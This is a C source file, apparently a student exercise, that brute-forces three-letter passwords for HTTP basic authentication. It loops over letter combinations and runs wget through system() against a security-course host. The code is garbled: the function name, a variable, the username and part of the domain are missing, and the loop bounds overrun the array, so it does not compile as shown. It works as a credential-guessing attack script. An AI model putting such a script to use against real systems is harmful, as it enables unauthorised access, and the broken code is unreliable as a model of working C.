#include <stdio.h>
#include <stdlib.h>
#include <sys/times.h>
#include <strings.h>
#include <string.h>
#include <ctype.h>



int ()
{
    int i,j,k,sysoutput;
    char pass[4],b[50], a[50],c[51] ,[2],string1[100],string2[100],temp1[3];
    char arr[52] ={'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
     'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'};
    strcpy(string1, "wget --http-user= --http-passwd=");
    strcpy(string2, " http://sec-crack.cs.rmit.edu./SEC/2/");
    
    for (i=0;i<=52;i++)
  { 
     [0] = arr[i];
     [1]  ='\0'; 
     strcpy(a,);
     
     printf("The  first  value is %s \n", a);    	

     for (j=0;j<=52;j++)
       {  [0] = arr[j];
          [1] = '\0'; 
	  strcpy(temp1,a);
	  strcat(a,);
	  strcpy(b,a);
	  strcpy(a,temp1);
	   printf("The  second value is %s \n", b);    	          
	for(k=0;k<=52;k++)
	  {  
	     [0] =arr[k];
	     [1] = '\0';
	     strcpy(temp1,b);
	     strcat(b,);
	     strcpy(pass,b);
	     strcpy(b,temp1);
	     pass[0] = arr[i];
           pass[1]= arr[j];
           pass[2]= arr[k];
           pass[3] = '\0';
		printf(" the  third  value of   the %s \n" ,pass);    
                 

		printf("%s\n",pass);
	  printf("*********\n" );
          strcat(string1, pass);
          strcat(string1, string2);
	  printf("\n executing %s\n", string1);
          sysoutput = system(string1);
          if (sysoutput == 0)
          {
            printf("\nsuccess %d %s\n",sysoutput,pass);
            exit(1);
          }


	  strcpy(string1, "");
	  strcpy(string1, "wget --http-user= --http-passwd=");
          
	         }
  	}   
   }
 }  
     
    
  
  
  
  
  
